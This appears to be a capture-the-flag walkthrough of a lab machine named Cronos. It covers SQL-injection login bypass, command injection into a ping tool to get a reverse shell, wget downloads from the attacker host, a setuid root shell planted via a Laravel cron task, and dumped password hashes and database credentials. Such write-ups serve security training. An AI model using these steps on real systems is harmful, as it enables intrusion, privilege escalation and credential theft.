
### DNS

```bash
dig axfr cronos.htb @10.10.10.13
```

```txt
; <<>> DiG 9.17.19-3-Debian <<>> axfr cronos.htb @10.10.10.13
;; global options: +cmd
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.		604800	IN	NS	ns1.cronos.htb.
cronos.htb.		604800	IN	A	10.10.10.13
admin.cronos.htb.	604800	IN	A	10.10.10.13
ns1.cronos.htb.		604800	IN	A	10.10.10.13
www.cronos.htb.		604800	IN	A	10.10.10.13
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 120 msec
;; SERVER: 10.10.10.13#53(10.10.10.13) (TCP)
;; WHEN: Sat Mar 19 14:50:00 EDT 2022
;; XFR size: 7 records (messages 1, bytes 203)
```


### admin.cronos.htb

![[admin_login_panel.png]]

```txt
user: ' or 1=1#
password: admin
```

![[enter_creds.png]]

```txt
http://admin.cronos.htb/welcome.php
```

![[net_tool.png]]

We can ping our machine.

![[ping_attacker.png]]

see the request in Burp
![[burp1.png]]

send to repeater, and inspect

we can see that commands are being executed via plaintext format.

![[burp_inspect_1.png]]

![[burp_inspect_2.png]]

Start a netcat listener on attacker machine:

```txt
nc -lvnp 4321
```

We can define a command to execute after the traceroute command by adding a semicolon after the ip address in the host field.


We can paste a reverse shell payload in to the entry field. Remember to adjust RHOST and RPORT values to fit your attacker machine parameters.

![[insert_reverse_shell_payload.png]]



We recive a shell on our attacker machine:

![[pop_www-data_shell.png]]

Linpeas output:

```
[+] [CVE-2017-16995] eBPF_verifier

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   
[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   
[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   
╔══════════╣Users with console
noulis:x:1000:1000:Noulis Panoulis,,,:/home/noulis:/bin/bash
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash


╔══════════╣ Analyzing Env Files (limit 70)
-rw-r--r-- 1 www-data www-data 572 Apr  9  2017 /var/www/laravel/.env
APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:+fUFGL45d1YZYlSTc0Sm71wPzJejQN/K6s9bHHihdYE=
APP_DEBUG=true
APP_LOG_LEVEL=debug
APP_URL=http://localhost
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=homestead
DB_USERNAME=homestead
DB_PASSWORD=secret

╔══════════╣ Searching passwords in config PHP files
   define('DB_DATABASE', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_USERNAME', 'admin');
            'password' => env('DB_PASSWORD', ''),
            'password' => env('REDIS_PASSWORD', null),

/usr/bin/screen  --->  GNU_Screen_4.5.0

/usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
			
```


![[local.txt.png]]

```txt
51d236438b333970dbba7dc3089be33b
```

odd cronjob:

```txt
* * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

With the laravel command scheduler, we can find out how to execute shell commands and schedule when they are executed:

![[how2_schedule_command1.png]]

![[how2_schedule_command2.png]]

We can also schedule the frequency of the command executing:

![[how2_schedule_command3.png]]

Reference: *https://laravel.com/docs/8.x/scheduling*

We can edit *Kernel.php*

```txt
-rw-r--r-- 1 www-data www-data 819 Apr  9  2017 Kernel.php
```

We can start to see how we can edit *Kernel.php*

Reference code from *https://laravel.com/docs/8.x/scheduling*

```php
<?php
 
namespace App\Console;
 
use Illuminate\Console\Scheduling\Schedule;
use Illuminate\Foundation\Console\Kernel as ConsoleKernel;
use Illuminate\Support\Facades\DB;
 
class Kernel extends ConsoleKernel
{
    /**
     * Define the application's command schedule.
     *
     * @param  \Illuminate\Console\Scheduling\Schedule  $schedule
     * @return void
     */
    protected function schedule(Schedule $schedule)
    {
        $schedule->call(function () {
            DB::table('recent_users')->delete();
        })->daily();
    }
}
```

We can see that there are no tasks scheduled:

![[kernel.php1.png]]

While we can access tools like *nano* and *vim*, our netcat shell does not allow for them to function properly. So we can make a copy on our attacker machine, edit it locally, and host it for the target to download and replace the original.

First lets create and compile a shell to execute. This way we are able to persist our privileges session.

On your attacker machine, run the following commands:

```bash
echo -e "int main(void){\n	setuid(0);\n	setgid(0);\n	system(\"/bin/bash\");\n}" > shell.c
gcc -o rootshell shell.c
```

Now we can make our *Kernel.php* file. Here is the code that I used:

```php
<?php

namespace App\Console;

use Illuminate\Console\Scheduling\Schedule;
use Illuminate\Foundation\Console\Kernel as ConsoleKernel;

class Kernel extends ConsoleKernel
{
    /**
     * The Artisan commands provided by your application.
     *
     * @var array
     */
    protected $commands = [
        //
    ];

    /**
     * Define the application's command schedule.
     *
     * @param  \Illuminate\Console\Scheduling\Schedule  $schedule
     * @return void
     */
    protected function schedule(Schedule $schedule)
    {
        $schedule->exec('chown root:root /tmp/rootshell;chmod 4755 /tmp/rootshell')->everyMinute();
        //          ->hourly();
    }

    /**
     * Register the Closure based commands for the application.
     *
     * @return void
     */
    protected function commands()
    {
        require base_path('routes/console.php');
    }
}
```

Now we can upload our files to the tartget machine. 

On your attacker machine, run the following command:

```bash
python3 -m http.server 8000
```

On the target machine, run the following commands:

```bash
cd /tmp/
wget http://10.10.14.12:8000/rootshell
cd /var/www/laravel/app/Console
wget http://10.10.14.12:8000/Kernel.php
mv Kernel.php.1 Kernel.php
```

After waiting for a couple minutes, we can see the file permissions change:

![[rootshell_perm1.png]]

![[rootshell_perm2.png]]

They changed from:

```txt
-rw-r--r--  1 www-data www-data 16232 Mar 19 23:39 rootshell
```

To:

```txt
-rwsr-xr-x  1 root root 16232 Mar 19 23:39 rootshell
```

Now we can execute the file:

```bash
cd /tmp/
./rootshell
```

![[root.txt.png]]

```txt
1703b8a3c9a8dde879942c79d02fd3a0
```

### /etc/passwd

```txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:108:112::/var/run/dbus:/bin/false
uuidd:x:109:113::/run/uuidd:/bin/false
dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
noulis:x:1000:1000:Noulis Panoulis,,,:/home/noulis:/bin/bash
bind:x:112:119::/var/cache/bind:/bin/false
```

### /etc/shadow

```txt
root:$6$L2m6DJwN$p/xas4tCNp19sda4q2ZzGC82Ix7GiEb7xvCbzWCsFHs/eR82G4/YOnni/.L69tpCkOGo5lm0AU7zh9lP5fL6A0:17247:0:99999:7:::
daemon:*:17212:0:99999:7:::
bin:*:17212:0:99999:7:::
sys:*:17212:0:99999:7:::
sync:*:17212:0:99999:7:::
games:*:17212:0:99999:7:::
man:*:17212:0:99999:7:::
lp:*:17212:0:99999:7:::
mail:*:17212:0:99999:7:::
news:*:17212:0:99999:7:::
uucp:*:17212:0:99999:7:::
proxy:*:17212:0:99999:7:::
www-data:$6$SYixzIan$P3cvyztSwA1lmILF3kpKcqZpYSDONYwMwplB62RWu1RklKqIGCX1zleXuVwzxjLcpU6bhiW9N03AWkzVUZhms.:17264:0:99999:7:::
backup:*:17212:0:99999:7:::
list:*:17212:0:99999:7:::
irc:*:17212:0:99999:7:::
gnats:*:17212:0:99999:7:::
nobody:*:17212:0:99999:7:::
systemd-timesync:*:17212:0:99999:7:::
systemd-network:*:17212:0:99999:7:::
systemd-resolve:*:17212:0:99999:7:::
systemd-bus-proxy:*:17212:0:99999:7:::
syslog:*:17212:0:99999:7:::
_apt:*:17212:0:99999:7:::
lxd:*:17247:0:99999:7:::
mysql:!:17247:0:99999:7:::
messagebus:*:17247:0:99999:7:::
uuidd:*:17247:0:99999:7:::
dnsmasq:*:17247:0:99999:7:::
sshd:*:17247:0:99999:7:::
noulis:$6$ApsLg5.I$Zd9blHPGRHAQOab94HKuQFtJ8m7ob8MFnX6WIIr0Aah6pW/aZ.yA3T1iU13lCSixrh6NG1.GHPl.QbjHSZmg7/:17247:0:99999:7:::
bind:*:17264:0:99999:7:::
```

### Persistence

